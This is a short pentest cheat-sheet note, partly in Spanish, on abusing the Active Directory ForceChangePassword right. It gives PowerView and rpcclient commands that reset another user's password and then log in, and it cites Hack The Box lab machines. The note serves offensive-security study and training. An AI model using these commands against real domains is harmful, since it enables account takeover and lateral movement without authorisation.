


## DESCRIPTION

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password

![[Pasted image 20230116192344.png]]


#### Mas información
* https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse
* https://0xdf.gitlab.io/2022/02/28/htb-object.html
* **BUEN RECURSO**: https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
* Necesary: PowerView (en Windows)

## EXPLOITATION

### OPTION 1: IN WINDOWS MACHINE

1. En la ayuda de Bloodhound nos indica como hacerlo, solo es necesario los dos pasos marcados:
![[Pasted image 20230117163502.png]]

```
$newpass = ConvertTo-SecureString 'PASSWORD!' -AsPlainText -Force
Set-DomainUserPassword -Identity <<USER>> -AccountPassword $newpass
```

2. Ya te puedes intentar conectar por WinRM, crackmapexec, etc.

### OPTION 2: IN KALI MACHINE WITH RPCCLIENT

![[Pasted image 20230216155310.png]]

1. Necesitamos credenciales de RPC Client:

```
rpcclient -U <<DOMAIN>>/<<USUARIO>> <<IP DOMAIN>>
rpcclient $> setuserinfo2 <<USUARIO AL QUE QUEREMOS CAMBIAR LA PAS>> 23 <<NUEVA CONTRASEÑA>>
```

2. Consultar otras alternativas en:
	* https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
	* https://github.com/mtrill47/OSCP-Notes/blob/main/Active%20Directory/AD.md
## MACHINES

* Hack The Box: Object, Blackfield



